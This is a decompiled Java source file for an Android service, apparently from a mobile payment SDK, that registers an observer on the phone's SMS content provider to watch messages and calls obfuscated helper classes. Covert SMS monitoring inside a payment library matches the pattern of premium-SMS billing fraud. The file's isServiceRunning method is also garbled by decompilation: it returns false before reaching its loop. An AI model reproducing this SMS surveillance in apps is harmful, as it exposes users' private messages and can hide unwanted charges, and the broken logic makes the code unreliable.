package com.bx.pay;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import com.bx.pay.a.c;
import java.util.Date;
import java.util.List;

public class WpaySmsService
  extends Service
{
  public static final String wpaySmsServiceName = "com.bx.pay.WpaySmsService";
  private ContentObserver mObserver;
  private r myBinder = new r(this);
  private SharedPreferences wiipaySP;
  
  public WpaySmsService() {}
  
  public static boolean isServiceRunning(Context paramContext, String paramString)
  {
    paramContext = ((ActivityManager)paramContext.getSystemService("activity")).getRunningServices(30);
    if (paramContext.size() <= 0) {}
    for (;;)
    {
      return false;
      int i = 0;
      while (i < paramContext.size())
      {
        if (((ActivityManager.RunningServiceInfo)paramContext.get(i)).service.getClassName().equals(paramString)) {
          return true;
        }
        i += 1;
      }
    }
  }
  
  private void registerSmsContentObserver()
  {
    this.mObserver = new q(this, new Handler(Looper.getMainLooper()));
    try
    {
      getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.mObserver);
      return;
    }
    catch (SecurityException localSecurityException)
    {
      Log.e("wiipay", "no permission for read sms");
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void MyMethod() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return this.myBinder;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.wiipaySP = c.a.getSharedPreferences("wiipay", 1);
    if (this.wiipaySP != null)
    {
      SharedPreferences.Editor localEditor = this.wiipaySP.edit();
      localEditor.putLong("serviceStartTime", new Date().getTime());
      localEditor.commit();
    }
    registerSmsContentObserver();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    try
    {
      n.a();
      return;
    }
    catch (Exception paramIntent) {}
  }
}
